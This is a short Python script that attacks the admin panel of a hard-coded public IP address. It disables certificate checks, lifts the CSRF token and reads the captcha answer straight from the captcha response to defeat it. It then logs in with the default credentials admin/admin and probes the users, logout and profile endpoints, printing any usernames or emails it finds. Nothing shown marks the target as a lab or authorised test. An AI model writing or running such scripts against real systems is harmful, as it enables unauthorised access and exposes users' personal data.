#!/usr/bin/env python3
"""
Check for actual admin functionality via different approaches
"""

import requests
import re
import json

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
def login():
    r = sess.get(TARGET + "/admin/login")
    token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
    if not token_match:
        return False
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if not captcha_match:
        return False
    captcha = captcha_match.group(1)
    r = sess.post(TARGET + "/admin/login", data={
        'username': 'admin',
        'password': 'admin',
        'captcha': captcha,
        '_token': token
    })
    return True

login()

# Try to access actual admin functionality
print("=== Testing actual admin functionality ===")

# Check if there's a users list endpoint
r = sess.get(TARGET + "/admin/users")
if r.text != "":
    # Check for actual user data
    if "username" in r.text.lower() or "email" in r.text.lower():
        print("Found user-related content!")
        print(r.text[:500])

# Check for logout functionality
print("\n=== Testing logout ===")
r = sess.get(TARGET + "/admin/logout")
print(f"Status: {r.status_code}")
print(f"Location: {r.headers.get('Location', 'None')}")

# Check for user profile
print("\n=== Testing profile ===")
r = sess.get(TARGET + "/admin/profile")
print(f"Status: {r.status_code}")